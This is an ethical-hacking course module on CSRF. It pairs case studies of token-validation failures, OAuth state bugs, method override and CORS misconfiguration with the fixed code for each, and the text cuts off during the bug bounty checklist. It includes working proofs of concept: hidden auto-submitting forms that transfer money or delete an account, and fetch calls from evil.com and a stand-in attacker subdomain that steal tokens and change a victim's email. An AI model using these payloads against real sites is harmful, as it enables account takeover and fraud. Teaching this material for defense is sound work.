# CSRF Module 10 — Real CVEs & Case Studies
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 10 of 12  
> **Topic:** Real CSRF Patterns, Case Studies, CVE Categories, OAuth CSRF, Implementation Failures  
> **Level:** Advanced — connects theory to real disclosed vulnerabilities and recurring implementation mistakes

---

## Table of Contents
1. [How to Read a CSRF CVE](#1-how-to-read-a-csrf-cve)
2. [Case Study 1 — Presence-Only Token Validation](#2-case-study-1--presence-only-token-validation)
3. [Case Study 2 — Token Not Tied to Session](#3-case-study-2--token-not-tied-to-session)
4. [Case Study 3 — Method Override CSRF](#4-case-study-3--method-override-csrf)
5. [Case Study 4 — Login CSRF to Account Takeover](#5-case-study-4--login-csrf-to-account-takeover)
6. [Case Study 5 — Subdomain Takeover + Token Leakage Chain](#6-case-study-5--subdomain-takeover--token-leakage-chain)
7. [Case Study 6 — JSON CSRF via CORS Misconfiguration](#7-case-study-6--json-csrf-via-cors-misconfiguration)
8. [Case Study 7 — Framework Default Misconfiguration](#8-case-study-7--framework-default-misconfiguration)
9. [CVE Pattern Categories](#9-cve-pattern-categories)
10. [OAuth State Parameter — CSRF in Authorization Flows](#10-oauth-state-parameter--csrf-in-authorization-flows)
11. [The Null Equality Bypass](#11-the-null-equality-bypass)
12. [Token Validation Failure Modes — Complete Reference](#12-token-validation-failure-modes--complete-reference)
13. [CSRF in Bug Bounty — What Researchers Actually Find](#13-csrf-in-bug-bounty--what-researchers-actually-find)
14. [How to Test Token Implementation Correctly](#14-how-to-test-token-implementation-correctly)
15. [Chain Composition in Real Disclosures](#15-chain-composition-in-real-disclosures)
16. [Key Terminology Reference](#16-key-terminology-reference)
17. [Common Misconceptions](#17-common-misconceptions)
18. [Bug Bounty Reference](#18-bug-bounty-reference)
19. [Module 10 Summary — What You Must Know Cold](#19-module-10-summary--what-you-must-know-cold)

---

## 1. How to Read a CSRF CVE

Apply this framework to every CSRF disclosure:

```
┌──────────────────────────────────────────────────────────────────┐
│              CSRF CVE ANALYSIS FRAMEWORK                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Q1: WHAT WAS THE VULNERABLE ACTION?                             │
│      What state-changing operation could be forced?              │
│                                                                  │
│  Q2: WHAT DEFENSES WERE IN PLACE?                                │
│      Token? SameSite? Origin? Re-auth? Content-Type?             │
│                                                                  │
│  Q3: WHAT TRUST ASSUMPTION DID EACH DEFENSE MAKE?               │
│      What did the developer believe that wasn't true?            │
│                                                                  │
│  Q4: HOW WAS EACH DEFENSE BYPASSED?                              │
│      What specific property of the defense failed?               │
│                                                                  │
│  Q5: WHAT WAS THE IMPACT CHAIN?                                  │
│      From forged request to worst-case outcome?                  │
│                                                                  │
│  Q6: WHAT WOULD HAVE PREVENTED IT?                               │
│      Which single fix breaks the chain earliest?                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 2. Case Study 1 — Presence-Only Token Validation

### The Vulnerability

Application had CSRF tokens on all forms. Security scanner confirmed tokens were present in every request. Manual testing revealed the server accepted any value in the token field.

### Vulnerable vs Correct Code

```python
# ══════════════ VULNERABLE ══════════════
def transfer_funds(request):
    token = request.POST.get('csrf_token')
    if not token:                          # ← checks PRESENCE only
        return HttpResponse(status=403)
    # Any non-empty value passes this check
    # "a", "x", "INVALID" all pass
    process_transfer(request.user, ...)
    return JsonResponse({'status': 'success'})

# ══════════════ CORRECT ══════════════
import hmac

def transfer_funds(request):
    submitted = request.POST.get('csrf_token', '')
    expected = request.session.get('csrf_token', '')
    
    # Guard 1: reject if either is empty
    if not submitted or not expected:
        return HttpResponse(status=403)
    
    # Guard 2: constant-time comparison against session value
    if not hmac.compare_digest(submitted, expected):
        return HttpResponse(status=403)
    
    process_transfer(request.user, ...)
    return JsonResponse({'status': 'success'})
```

### The Attack PoC

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.victim.com/transfer"
        method="POST"
        style="display:none">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="csrf_token" value="literally_anything">
    <!--
      Server checks: is csrf_token present? YES
      Server does NOT check: does it match the session token?
      Result: request accepted, transfer executes
    -->
  </form>
</body>
</html>
```

### Why This Happens — Development Scenarios

```
SCENARIO A — Split responsibility confusion:
  Frontend dev: "I added the token to all forms" ✓
  Backend dev:  "I added the CSRF check"         ✓ (presence only)
  Neither: validated the value against the session

SCENARIO B — Framework bypass:
  Framework handles CSRF automatically for standard views
  Developer adds manual API endpoint outside framework routing
  Copies presence-check pattern without implementing comparison
  Never accesses session for expected value

SCENARIO C — Test environment shortcut:
  if settings.TESTING: return True  # skip CSRF in tests
  TESTING flag accidentally present in production config
  All CSRF validation silently skipped

SCENARIO D — Incremental addition under time pressure:
  "I'll just check it's present for now and fix validation later"
  "Later" never comes
  Creates false sense of security — scanner shows token present
```

### Testing for Presence-Only Validation

```
Test 1: Remove token entirely → 403? (tests basic presence check)
Test 2: Send empty string → 403? (tests falsy value handling)
Test 3: Send random 32-char string → 403? (tests VALUE validation)
Test 4: Send another user's valid token → 403? (tests session binding)

If Test 3 returns 200: presence-only validation confirmed
If Test 4 returns 200: token not session-bound
Both are critical findings
```

### Severity

```
Severity: Critical (if financial/ATO action)
Lesson:   Scanner tools check token PRESENCE, not validation correctness
          Presence-only = false sense of security (worse than no token)
          Manual testing must verify all four test cases above
```

---

## 3. Case Study 2 — Token Not Tied to Session

### The Vulnerability

CSRF tokens generated correctly (random, server-side) but stored in a global pool rather than per-session.

### Vulnerable vs Correct Architecture

```python
# ══════════════ VULNERABLE: Global Token Pool ══════════════
VALID_TOKENS = set()  # ← global, shared across all users

def generate_token():
    token = secrets.token_urlsafe(32)
    VALID_TOKENS.add(token)  # any user's token is globally valid
    return token

def validate_token(token):
    if token in VALID_TOKENS:
        VALID_TOKENS.discard(token)
        return True
    return False  # token exists but not tied to any session

# ══════════════ CORRECT: Per-Session Storage ══════════════
def generate_token(request):
    token = secrets.token_urlsafe(32)
    request.session['csrf_token'] = token  # bound to THIS session
    return token

def validate_token(request):
    submitted = request.POST.get('csrf_token', '')
    expected = request.session.get('csrf_token', '')
    if not submitted or not expected:
        return False
    return hmac.compare_digest(submitted, expected)
    # Only valid if submitted matches THIS request's session
```

### The Attack

```
1. Attacker creates own account on victim.com
2. Attacker loads a form → receives valid CSRF token: "xK9mP2..."
3. Token is in VALID_TOKENS (global pool)
4. Attacker forges request targeting VICTIM's session:
   POST /change-email
   Cookie: [victim's session — auto-attached by browser]
   Body: email=attacker@evil.com&csrf_token=xK9mP2...
5. Server checks: "xK9mP2..." in VALID_TOKENS → YES → accepts
6. Victim's email changed using attacker's token
```

### Why Session Binding Is Non-Negotiable

```
Without session binding:
  Any authenticated user's token works against any other user
  Attacker only needs to be registered to bypass CSRF protection
  The "secret" is not secret — it's valid for the entire application

With session binding:
  Token for session A is invalid for session B
  Attacker's token cannot be used against victim's session
  Even if token is leaked, it only works with the session that generated it
```

---

## 4. Case Study 3 — Method Override CSRF

### The Vulnerability

Rails application protecting state-changing endpoints with CSRF tokens. DELETE account endpoint bypassed via `_method` parameter override.

### The Exploit Chain

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/account"
        method="POST"
        style="display:none">
    <!-- Rails method override: POST treated as DELETE by router -->
    <input type="hidden" name="_method" value="DELETE">
    <input type="hidden" name="confirm" value="true">
    <!--
      Rails routing: sees _method=DELETE → routes to destroy action
      destroy action had: skip_before_action :verify_authenticity_token
        (because "API DELETE requests don't use tokens")
      But this is a FORM POST with _method=DELETE
      The skip applies → no CSRF check → account deleted
    -->
  </form>
</body>
</html>
```

### The Defense Gap

```
Developer's logic:
  "DELETE requests come from our API (token auth)"
  "skip_before_action :verify_authenticity_token on delete"
  "HTML forms can't send DELETE anyway"

What they missed:
  _method=DELETE converts a POST form to a Rails DELETE route
  The POST is a simple request (no preflight, cookies sent)
  The CSRF skip for DELETE now applies to this form submission
  Method override bridges HTML form limitations into REST verbs

Lesson:
  Method-specific CSRF exemptions must account for method override
  skip_before_action on DELETE/PUT applies to _method override too
  If using method override: apply CSRF to the underlying POST method
  OR disable _method override for sensitive controller actions
```

---

## 5. Case Study 4 — Login CSRF to Account Takeover

### The Vulnerability

Social platform with no CSRF token on login endpoint. Attacker forces victim to authenticate as attacker's account.

### Full Attack Chain

```
Step 1: Attacker creates account
  username: attacker_puppet
  password: KnownPassword123

Step 2: Attacker builds login CSRF page
  <body onload="document.forms[0].submit()">
  <form action="https://social.victim.com/login" method="POST">
    <input type="hidden" name="username" value="attacker_puppet">
    <input type="hidden" name="password" value="KnownPassword123">
  </form>

Step 3: Victim loads attacker's page
  If victim is logged in: session replaced or second tab auto-logs in
  If victim is logged out: victim authenticated as attacker's account

Step 4: Victim uses application believing they are themselves
  Victim connects real Google/Facebook OAuth account
    → Now linked to attacker's account
  Victim enters real email for "notifications"
    → Stored in attacker's account profile
  Victim saves payment/shipping information
    → Saved under attacker's account
  Victim sends private messages
    → Attacker reads them
  Victim uploads documents/ID for verification
    → Attacker has victim's identity documents

Step 5: Attacker logs into their own account
  Reads victim's email, OAuth connections, payment info
  Uses OAuth link to access victim's other connected services
  → Full identity and financial exposure

Impact: Critical — identity theft, financial data exposure, ATO
```

### Why Login Endpoints Need CSRF Protection

```
Common incorrect reasoning:
  "Login doesn't need CSRF — user isn't authenticated yet"
  "No session to protect before login"
  "Login form is public — anyone can view it anyway"

Why it is wrong:
  Login CSRF doesn't steal a session
  It CREATES a session under attacker's identity
  Victim then submits their own real data into attacker's account
  Any data entered = accessible to attacker

Frameworks that protect only authenticated routes miss this entirely.
Login form must have CSRF token.

Additional vector — re-authentication CSRF:
  Application requires password to confirm sensitive action
  If re-auth form has no CSRF token:
    Attacker forces re-auth with attacker's credentials
    Sensitive action proceeds authenticated as attacker
```

---

## 6. Case Study 5 — Subdomain Takeover + Token Leakage Chain

### The Four Weaknesses Mapped

```
┌──────────────────────────────────────────────────────────────────┐
│ Weakness          │ Intended Protection    │ Why It Failed        │
├───────────────────┼────────────────────────┼──────────────────────┤
│ 1. No subdomain   │ Only victim.com serves │ DNS CNAME pointed to │
│    monitoring     │ content to users       │ unclaimed resource   │
│                   │                        │ Attacker claimed it  │
│                   │                        │ Controls subdomain   │
├───────────────────┼────────────────────────┼──────────────────────┤
│ 2. SameSite=Lax   │ Cross-site requests    │ legacy.victim.com is │
│    + Origin check │ blocked; source        │ SAME-SITE — Lax does │
│                   │ validated              │ not restrict it      │
│                   │                        │ Origin passes check  │
├───────────────────┼────────────────────────┼──────────────────────┤
│ 3. Stable per-    │ Proves request came    │ Stability + leakage  │
│    session token  │ from server's page     │ = exploitable        │
│                   │                        │ Token valid for      │
│                   │                        │ entire session       │
├───────────────────┼────────────────────────┼──────────────────────┤
│ 4. Token in URL   │ Token should be secret │ URL in Referer header│
│    parameter      │ and unforgeable        │ sent to third-party  │
│                   │                        │ analytics resource   │
│                   │                        │ Attacker reads logs  │
└──────────────────────────────────────────────────────────────────┘
```

### The Full Attack Timeline

```
t=0: Attacker discovers legacy.victim.com → dangling CNAME → unclaimed S3
  ↓
t=1: Attacker claims S3 bucket → controls legacy.victim.com
  ↓
t=2: Attacker triggers password reset for victim (or waits for natural reset)
  ↓
t=3: Server sends reset email:
     URL: https://victim.com/reset?token=abc&csrf=xK9mP2qL...
  ↓
t=4: Victim clicks reset link → browser loads reset page
     Reset page loads: <script src="https://analytics.attacker.com/t.js">
  ↓
t=5: Browser sends to attacker's analytics server:
     GET /t.js HTTP/1.1
     Referer: https://victim.com/reset?token=abc&csrf=xK9mP2qL...
                                                    ↑ TOKEN LEAKED
  ↓
t=6: Attacker reads server logs → extracts csrf=xK9mP2qL...
  ↓
t=7: Attacker serves CSRF payload from legacy.victim.com:
     fetch("https://app.victim.com/account/change-email", {
       method: "POST",
       credentials: "include",         // same-site → session cookie sent ✓
       body: `email=attacker@evil.com&csrf_token=xK9mP2qL...`
     });
  ↓
t=8: Server validates:
     Cookie:     present (same-site) ✓
     Origin:     legacy.victim.com (passes check) ✓
     csrf_token: xK9mP2qL... (valid per-session value) ✓
  ↓
t=9: All three defenses bypassed → email changed → ATO chain begins
```

### Fix Priority Analysis

```
FIX BY CHAIN POSITION:

Earliest operational fix (breaks at t=1):
  → Reclaim legacy.victim.com DNS record
  → Implement continuous subdomain monitoring
  Weakness: requires ongoing operational vigilance

Earliest architectural fix (breaks at t=5, regardless of subdomain state):
  → Remove CSRF token from all URL parameters
  → Token in URL = always a leakage risk
  → This fix works even if another subdomain is compromised in future

Defense strengthening fixes:
  → Per-request token rotation (token expires before attacker uses it)
  → Strict CORS allowlist (legacy.victim.com not in allowlist)
  → Subdomain enumeration + dangling CNAME detection pipeline
  → Referrer-Policy: no-referrer on sensitive pages
```

---

## 7. Case Study 6 — JSON CSRF via CORS Misconfiguration

### The Vulnerability

REST API used `Content-Type: application/json` as sole CSRF defense. CORS policy reflected Origin header with `Access-Control-Allow-Credentials: true`.

### Vulnerable CORS Code

```python
# VULNERABLE: Blind origin reflection
def cors_middleware(get_response):
    def middleware(request):
        response = get_response(request)
        origin = request.headers.get('Origin')
        if origin:
            # Reflects ANY origin — attacker.com included
            response['Access-Control-Allow-Origin'] = origin
            response['Access-Control-Allow-Credentials'] = 'true'
            response['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
            response['Access-Control-Allow-Headers'] = 'Content-Type'
        return response
    return middleware
```

### The Attack

```javascript
// Attacker's page on evil.com

// Step 1: Preflight sent to api.victim.com
// OPTIONS /user/profile
// Origin: https://evil.com
// → Server reflects: ACAO: https://evil.com + ACAC: true
// → Preflight approved

// Step 2: Read CSRF token from victim's profile (CORS allows reading response)
const resp = await fetch('https://api.victim.com/user/profile', {
  credentials: 'include'
});
const csrfToken = resp.headers.get('X-CSRF-Token');
// evil.com can read this response — CORS allows it

// Step 3: Forge authenticated state-changing request
await fetch('https://api.victim.com/user/change-email', {
  method: 'PUT',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // token obtained via CORS response read
  },
  body: JSON.stringify({ email: 'attacker@evil.com' })
});
```

### Why Content-Type Was Insufficient

```
Developer's flawed assumption:
  "JSON requires preflight"
  "HTML forms can't produce JSON"
  "Preflight is our CSRF gate"

What was missed:
  Preflight defers entirely to the CORS policy
  CORS policy reflects any Origin → evil.com's preflight approved
  evil.com's fetch() proceeds with session cookie
  evil.com can also READ responses (ACAO + ACAC: true)
  CSRF token (if any) extractable from response

Two separate bugs requiring two separate fixes:
  Bug 1: CORS origin reflection → fix: exact allowlist
  Bug 2: Content-Type as sole CSRF defense → fix: add CSRF token
```

---

## 8. Case Study 7 — Framework Default Misconfiguration

### The Pattern

Django REST API following tutorial advice to "remove CSRF middleware for APIs." Session-based authentication added without re-enabling CSRF.

### The Vulnerable Configuration

```python
# settings.py — developer followed "API best practices" tutorial
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',  ← removed
    'django.contrib.auth.middleware.AuthenticationMiddleware',
]

# views.py — all authenticated, none CSRF-protected
@login_required
def delete_account(request):
    if request.method == 'POST':
        request.user.delete()
        return JsonResponse({'deleted': True})

@login_required
def transfer(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        process_transfer(request.user, data['to'], data['amount'])
        return JsonResponse({'status': 'success'})
```

### The Attack Surface

```
Blast radius: ALL authenticated endpoints

POST /delete-account  → account deletion (Critical)
POST /transfer        → financial loss (Critical)
POST /change-email    → ATO chain (Critical)
POST /add-admin       → privilege escalation (Critical)

Root cause mismatch:
  Tutorial advice: "Remove CSRF for APIs"
  Correct context: APIs using stateless JWT in Authorization header
  This application: session cookies (ambient authority)
  
  Tutorial advice is correct for JWT-in-header APIs
  Tutorial advice is catastrophically wrong for session-cookie APIs
  Developer applied advice without understanding the precondition
```

---

## 9. CVE Pattern Categories

### Category 1 — Account Takeover via Email/Password Change CSRF

```
Pattern:    POST /account/email or /account/password
            No CSRF token or presence-only validation
Impact:     Change email → password reset → full ATO
Severity:   Critical
Common gap: Developer treats account settings as "low risk"
            Only protects financial endpoints with tokens
Fix:        CSRF token on ALL state-changing endpoints
            Re-authentication for email/password change
```

### Category 2 — Admin Action CSRF

```
Pattern:    Admin panel endpoints without CSRF protection
            "Admin is internal, so it's safe"
Impact:     Add attacker as admin, delete users, change config
Severity:   Critical
Common gap: Admin panels added later, CSRF middleware excluded
            Admin endpoints in different framework or subdomain
Fix:        Admin panels need CSRF protection too
            SameSite=Strict for admin session cookies
```

### Category 3 — OAuth CSRF via Missing/Invalid State Parameter

```
Pattern:    OAuth callback without state parameter validation
            Or: state compared without null check
Impact:     Attacker's OAuth identity linked to victim's account
            Full account takeover via OAuth login
Severity:   Critical
Common gap: State parameter not used, or:
            if state == session.get('state') → None == None → True
Fix:        Generate cryptographic state, store in session
            Use session.pop() (single-use)
            Explicit null/empty rejection before comparison
            Constant-time comparison
```

### Category 4 — Payment/Subscription CSRF

```
Pattern:    Billing endpoints (cancel, downgrade, initiate charge)
            without CSRF protection
Impact:     Unauthorized cancellations, charges, plan changes
Severity:   High/Critical
Common gap: "Payment provider handles security"
            App-side billing endpoint unprotected
Fix:        CSRF token on all billing endpoints
            Re-authentication for large transactions
```

### Category 5 — SPA/API CSRF via CORS Misconfiguration

```
Pattern:    REST API with blind origin reflection + ACAC: true
Impact:     Full authenticated API access + response reading
            CSRF + data exfiltration
Severity:   Critical
Common gap: CORS middleware copied from Stack Overflow
            "if (origin) { reflect(origin) }" pattern
Fix:        Exact allowlist: {"https://app.victim.com"}
            Never reflect Origin header
            ACAC: true only for explicitly trusted origins
```

### Category 6 — Login CSRF / Re-Auth CSRF

```
Pattern:    Login or re-authentication form without CSRF token
Impact:     Victim authenticated as attacker (login CSRF)
            Attacker's credentials used for re-auth gate (re-auth CSRF)
Severity:   High/Critical
Common gap: CSRF protection only added to authenticated routes
            Login is "public" — developers skip CSRF
Fix:        CSRF token on login form
            CSRF token on all re-authentication forms
```

---

## 10. OAuth State Parameter — CSRF in Authorization Flows

### Why OAuth Needs CSRF Protection

```
OAuth callback URL: https://app.victim.com/oauth/callback?code=AUTH_CODE&state=...

The code parameter is attacker-controllable if attacker initiates OAuth flow
Without state validation: attacker can force victim's browser to
submit attacker's OAuth code, linking attacker's identity to victim's account
```

### Vulnerable Implementation

```python
# VULNERABLE
def oauth_callback(request):
    state = request.GET.get('state')
    # Bug 1: None == None passes when state absent from both
    if state == request.session.get('oauth_state'):
        process_oauth(request)  # executes with victim's session
    # Bug 2: session.get() doesn't invalidate — token reusable
```

### Attack — Null Equality Bypass

```
Attacker sends victim to:
  https://app.victim.com/oauth/callback?code=ATTACKER_CODE
  (no state parameter)

Server:
  state = request.GET.get('state')          → None
  request.session.get('oauth_state')        → None (not set)
  None == None                              → True
  process_oauth() executes
  ATTACKER_CODE processed in VICTIM's session
  Attacker's identity linked to victim's account
```

### Attack — Token Replay

```
Attacker completes own OAuth flow:
  session['oauth_state'] = "xK9mP2..."
  Attacker visits callback: ?code=...&state=xK9mP2...
  State consumed... but only if using .pop()
  If using .get(): state remains valid in session
  
Attacker tricks victim into visiting same callback URL:
  https://app.victim.com/oauth/callback?code=ATTACKER_CODE&state=xK9mP2...
  Victim's session may have same state (if shared or predictable)
  OR attacker exploits a CSRF on the state-setting endpoint
```

### Correct OAuth CSRF Implementation

```python
import secrets
import hmac

# OAuth initiation
def oauth_login(request):
    state = secrets.token_urlsafe(32)
    request.session['oauth_state'] = state
    # Redirect to provider with state
    return redirect(
        f"https://accounts.google.com/oauth?"
        f"client_id=...&redirect_uri=...&state={state}&response_type=code"
    )

# OAuth callback
def oauth_callback(request):
    received = request.GET.get('state', '')
    # .pop() = single-use: removes from session after reading
    expected = request.session.pop('oauth_state', '')
    
    # Guard 1: explicit empty check
    if not received or not expected:
        return HttpResponse('Invalid state parameter', status=403)
    
    # Guard 2: constant-time comparison
    if not hmac.compare_digest(received, expected):
        return HttpResponse('Invalid state parameter', status=403)
    
    # Guard 3: validate code, exchange for token
    code = request.GET.get('code', '')
    if not code:
        return HttpResponse('Missing authorization code', status=400)
    
    # Safe to process
    exchange_code_for_token(code)
```

---

## 11. The Null Equality Bypass

A subtle but critical implementation bug that appears in CSRF token and OAuth state validation.

### The Pattern

```python
# VULNERABLE in Python:
if token == session.get('csrf_token'):
    proceed()
# When token=None and session has no csrf_token:
# None == None → True → proceeds with no validation

# VULNERABLE in JavaScript:
if (token === session.csrfToken) { proceed(); }
// undefined === undefined → true

# VULNERABLE in PHP:
if ($token == $session['csrf_token']) { proceed(); }
// null == null → true (loose comparison)
// Also: "0" == false → true (type coercion)
```

### The Fix

```python
# CORRECT: Explicit empty check before comparison
submitted = request.POST.get('csrf_token', '')
expected = request.session.get('csrf_token', '')

# Step 1: Reject explicitly empty values
if not submitted or not expected:
    return HttpResponse(status=403)

# Step 2: Then compare (now guaranteed non-empty)
if not hmac.compare_digest(submitted, expected):
    return HttpResponse(status=403)
```

### Where This Bug Appears

```
1. CSRF token validation:
   if token == session.get('csrf_token') → None == None bypass

2. OAuth state parameter:
   if state == session.get('oauth_state') → None == None bypass

3. Password reset token validation:
   if token == stored_token → None == None if token already used/expired

4. API key validation:
   if key == config.get('api_key') → None == None if key not configured

Pattern: Any security-critical comparison using .get() with potential None
Fix: Always reject None/empty BEFORE comparing
```

---

## 12. Token Validation Failure Modes — Complete Reference

```
┌─────────────────────────────┬──────────────────────────────────────────┐
│ Failure Mode                │ Test / Detection                         │
├─────────────────────────────┼──────────────────────────────────────────┤
│ No token at all             │ Send request without token field         │
│                             │ → 200 OK = no validation whatsoever      │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Presence-only check         │ Send token=any_random_value              │
│                             │ → 200 OK = value not checked             │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Empty string accepted       │ Send token= (empty)                      │
│                             │ → 200 OK = empty string check missing    │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Null equality bypass        │ Send no token + session has no token     │
│                             │ → 200 OK = None == None passes           │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Not session-bound           │ Use another user's valid token           │
│                             │ → 200 OK = global pool or cross-user     │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Method exemption            │ Send request as GET (no token)           │
│                             │ → 200 OK = GET not validated             │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Content-type exemption      │ Change to text/plain, no token           │
│                             │ → 200 OK = validation skipped for type   │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Timing attack vulnerable    │ Using == instead of constant-time        │
│                             │ → Timing side channel (advanced)         │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Token not invalidated       │ Reuse old token after logout/rotation    │
│                             │ → 200 OK = single-use not enforced       │
├─────────────────────────────┼──────────────────────────────────────────┤
│ Predictable token           │ Analyze token entropy/pattern            │
│                             │ → Guessable = brute-forceable            │
└─────────────────────────────┴──────────────────────────────────────────┘
```

---

## 13. CSRF in Bug Bounty — What Researchers Actually Find

### Most Common Real Findings

```
FINDING 1: Missing token on sensitive endpoint (forgotten endpoint)
  Pattern: CSRF tokens on most endpoints, one forgotten
  Common locations: password change, email change, OAuth callback,
                    admin actions, webhook configuration, API key generation
  Why: Developer adds new feature without CSRF in mind

FINDING 2: Presence-only validation (Case Study 1)
  Pattern: Token present but any value accepted
  Found via: sending random value → 200 OK
  Why: Rushed implementation, split responsibility, framework bypass

FINDING 3: Token not session-bound (Case Study 2)
  Pattern: Token valid for wrong user's session
  Found via: using own token against target account
  Why: Global token pool, incorrect storage implementation

FINDING 4: Framework CSRF disabled (Case Study 7)
  Pattern: .csrf().disable(), @csrf_exempt, middleware commented out
  Found via: no token in any request, or token ignored
  Why: Tutorial advice, mobile API "fix", API mode default

FINDING 5: CORS misconfiguration enables CSRF (Case Study 6)
  Pattern: Origin reflection + ACAC: true
  Found via: sending Origin: attacker.com, checking ACAO in response
  Why: Copy-pasted CORS middleware without security review

FINDING 6: Login/OAuth CSRF (Case Studies 4, Category 3)
  Pattern: No CSRF on login or OAuth flows
  Found via: forge login request, check if accepted without token
  Why: CSRF protection only on authenticated routes
```

---

## 14. How to Test Token Implementation Correctly

```
STEP 1: Identify all state-changing endpoints
  Map every POST/PUT/PATCH/DELETE endpoint
  Map any GET endpoints with side effects
  Include: login, logout, OAuth flows, webhooks

STEP 2: Baseline — capture legitimate request
  Intercept normal form submission
  Note: token field name, token value, token location (body/header)

STEP 3: Run validation test suite
  Test A: Remove token field entirely → expect 403
  Test B: Send empty value (token=) → expect 403
  Test C: Send random value (token=aaaaaaa...) → expect 403
  Test D: Send own account's valid token against target account → expect 403
  Test E: Reuse token from previous request → expect 403 (if per-request)
  Test F: Switch method to GET, no token → expect 403 or 405
  Test G: Change Content-Type to text/plain, no token → expect 403

STEP 4: Check token properties
  Is token cryptographically random? (check entropy, length)
  Is token stable across page loads? (per-session vs per-request)
  Does token appear in any URL? (Referer leakage risk)
  Is token in a cookie? (double-submit or synchronizer)

STEP 5: If token passes all tests — check bypass scenarios
  Is there XSS on same origin?
  Is there subdomain takeover risk?
  Is CORS policy restrictive?
  Are there alternative auth paths (remember-me, OAuth)?

STEP 6: Document findings
  Which test cases failed
  Specific impact of each failure
  PoC demonstrating exploitation
```

---

## 15. Chain Composition in Real Disclosures

Real high-severity CSRF disclosures rarely involve a single missing token. They chain multiple weaknesses.

### Common Chain Patterns

```
CHAIN 1: Subdomain Takeover → SameSite Bypass → Token Leakage → ATO
  Primitives: subdomain takeover + token in URL + stable token
  Defense required at each link: subdomain monitoring + token not in URL
                                  + per-request rotation

CHAIN 2: XSS → Token Extraction → CSRF
  Primitives: XSS on same origin + stable CSRF token
  Defeat: XSS reads token from DOM → forges request with valid token
  Defense: Fix XSS first; CSRF token provides no protection if XSS exists

CHAIN 3: CORS Misconfiguration → Response Read → Token Extraction → CSRF
  Primitives: origin reflection + ACAC: true + token in response
  Defeat: Cross-origin fetch() reads response → extracts token → uses it
  Defense: Exact CORS allowlist; never reflect Origin

CHAIN 4: Login CSRF → Victim Submits Data → Attacker Reads
  Primitives: no CSRF on login + victim submits personal data
  Defeat: Force login as attacker → victim submits into attacker's account
  Defense: CSRF token on login form

CHAIN 5: Method Override → CSRF Exemption Bypass → State Change
  Primitives: method override enabled + CSRF exempt for override target method
  Defeat: POST form with _method=DELETE → exempt applies → no CSRF check
  Defense: CSRF check on underlying HTTP method regardless of override
```

### Severity of Chains vs Single Findings

```
Single finding: missing CSRF token on low-impact endpoint
  → Low/Medium

Single finding: missing CSRF token on account deletion
  → High/Critical

Chain: subdomain takeover + token leakage + ATO
  → Critical (multiple findings compound)
  → Report each component as separate finding
  → Report the chain as the primary finding
  
When reporting chains:
  1. Title: "CSRF token bypass via [technique] leading to [impact]"
  2. List each component vulnerability
  3. Show the chain step by step
  4. Each component may be a separate submission
  5. Combined severity = worst-case chain impact
```

---

## 16. Key Terminology Reference

| Term | Definition |
|------|------------|
| **Presence-only validation** | CSRF check that only verifies token field exists, not its value |
| **Global token pool** | CSRF tokens stored application-wide rather than per-session; any user's token valid for any session |
| **Session binding** | CSRF token stored in and validated against the specific session making the request |
| **Null equality bypass** | Security check passes when both sides are None/null/undefined (e.g., None == None → True) |
| **Constant-time comparison** | String comparison that takes equal time regardless of where values differ; prevents timing attacks |
| **OAuth state parameter** | CSRF token for OAuth flows; prevents forged OAuth callbacks |
| **Login CSRF** | Forcing victim to authenticate as attacker; victim submits data into attacker's account |
| **Re-auth CSRF** | Forging re-authentication prompt with attacker's credentials to bypass confirmation gates |
| **Token replay** | Reusing a previously captured CSRF token after it should have been invalidated |
| **Method override** | Framework feature (_method parameter) converting POST to PUT/DELETE; can bypass method-specific CSRF exemptions |
| **Dangling CNAME** | DNS CNAME pointing to unclaimed resource; enables subdomain takeover |
| **Origin reflection** | Server copying Origin header value into ACAO; enables credentialed cross-origin requests from any origin |
| **Referer leakage** | Sensitive data in URL exposed to third parties via Referer header on subsequent requests |
| **Token leakage** | CSRF token exposed through URL parameters, Referer headers, CORS reads, or XSS |
| **Chain composition** | Combining multiple partial vulnerabilities to achieve an impact no single vulnerability enables alone |

---

## 17. Common Misconceptions

### ❌ "If a CSRF token is present in the request, the endpoint is protected"
**Wrong.** The token must be validated against the session value, not just checked for presence. Presence-only validation is one of the most common real-world CSRF implementation failures.

### ❌ "Security scanners will catch CSRF token validation weaknesses"
**Wrong.** Automated scanners detect token PRESENCE. They do not verify that the server validates the token VALUE. A scanner seeing a token in every request will mark CSRF as "protected" regardless of whether validation is correct.

### ❌ "OAuth state parameter validation just means checking it's not empty"
**Wrong.** State must be: cryptographically random, stored per-session, single-use (pop not get), explicitly non-empty checked before comparison, constant-time compared. Missing any of these creates exploitable gaps.

### ❌ "None == None being True is an edge case that doesn't happen in practice"
**Wrong.** This pattern appears in real disclosed vulnerabilities. It occurs naturally when: token not yet generated, session expired, token already consumed, or parameter omitted by attacker. Explicit empty checks before comparison are mandatory.

### ❌ "Login endpoints don't need CSRF because the user isn't authenticated"
**Wrong.** Login CSRF doesn't require the victim to be authenticated. It creates a new session under the attacker's identity. The victim then submits their own real data into the attacker's account. Login endpoints need CSRF tokens.

### ❌ "High-impact CSRF requires sophisticated attacks"
**Wrong.** Some of the most critical CSRF findings are simple missing tokens on high-value endpoints. A missing token on an email-change endpoint is one form submission away from Critical severity.

---

## 18. Bug Bounty Reference

### Finding Prioritization

```
IMMEDIATE HIGH-VALUE TARGETS:
  □ Email change endpoint — missing token = ATO chain
  □ Password change endpoint — missing token = ATO
